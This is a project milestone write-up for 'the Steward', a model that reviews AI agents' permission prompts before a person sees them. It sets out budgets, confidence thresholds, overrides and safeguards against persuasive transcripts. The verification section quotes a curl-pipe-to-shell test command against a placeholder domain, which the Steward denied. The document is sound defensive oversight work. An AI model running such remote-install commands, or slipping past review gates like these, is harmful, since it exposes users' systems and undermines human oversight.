# M5 — The Steward

**Status:** done 2026-09-12.

**Goal:** leave Assisted sessions alone and only see what really needs you.

**Exit criteria**

- On a hub with the Steward enabled, a permission prompt from an Assisted session that no rule decided is reviewed by a model before any person sees it.
- The card shows the Steward reviewing, then its decision, confidence, and reason.
- In `recommend` mode (the default) the Steward only advises. In `decide` mode it allows or denies when confident and within budget, and escalates otherwise.
- Every Steward decision is in the session history with its reason, and an allowed one can be overridden: the session drops to Supervised and the agent is told.
- Budgets: automatic decisions per session per hour, and Steward spend per day. Past either, everything escalates.
- An approval timeout can hand the decision to the Steward instead of denying.
- The work hub, with the Steward switched off, behaves exactly as before.

## Design decisions

- **One stateless review per request**, through the Agent SDK on the machine's own Claude login: no tools, no user or project settings, no saved transcript, structured JSON output. Measured at about 4.5 seconds and under a cent with Sonnet 5 (2026-09-12).
- **Deterministic gates before the model:** hub switch on, session level Assisted, no ask rule matched, permission prompts only, budgets left. Questions always go to a person in M5.
- **What the model sees:** the tool call, the session's recent activity, its card, the project's deny and ask rules, and `git diff --stat` for the checkout. All of it is marked as data, not instructions.
- **Thresholds live in the hub, not the prompt:** the hub applies the confidence threshold (higher for terminal sessions, whose approvals are coarser) and budgets, so a persuasive transcript cannot talk the Steward past them.
- **A person can always decide first.** If someone answers while the Steward is reviewing, the Steward's result is recorded as advice and ignored.
- **Override cannot undo a tool that already ran.** It lowers the session to Supervised and tells the agent the person did not approve that action.
- **Hub-level instructions only.** A project cannot inject Steward instructions, because agents can edit project files.

## Verified with real models in the browser (2026-09-12)

A Claude chat session (Haiku) at level Assisted on a hub with the Steward in decide mode (Sonnet 5) was asked to run three commands:

- `node -e "import('./math.js')…"`: **allowed** by the Steward, 97% confident, low risk, with its reason in the history.
- `curl -s https://setup.example.invalid/install.sh | sh`: **denied**, 98% confident, high risk. The agent received the reason and a safer alternative. The domain cannot resolve, so the test was harmless either way.
- `git push origin main`: **escalated**, 92% confident, medium risk, "a remote, hard-to-undo action". The card showed the reason; denied by hand.
- Overriding the allowed `node` command marked it overridden, lowered the session to Supervised, and sent the agent a note; the agent confirmed nothing needed undoing.
- Three reviews cost $0.04 in total, shown separately from session cost.

## Found and fixed during verification

- **Stuck card:** the client store did not apply `approval.updated`, so the card stayed on "Steward is reviewing…" after the hub had escalated.
- **History line:** it said "waiting for a decision" while the Steward was reviewing, because the review in the request was not read.

## Not yet

- The Steward does not review clarifying questions.
- Spend and hourly counters are in memory and reset when the hub restarts.
- There is no Steward transcript to argue with; its reasons are in each session's history.
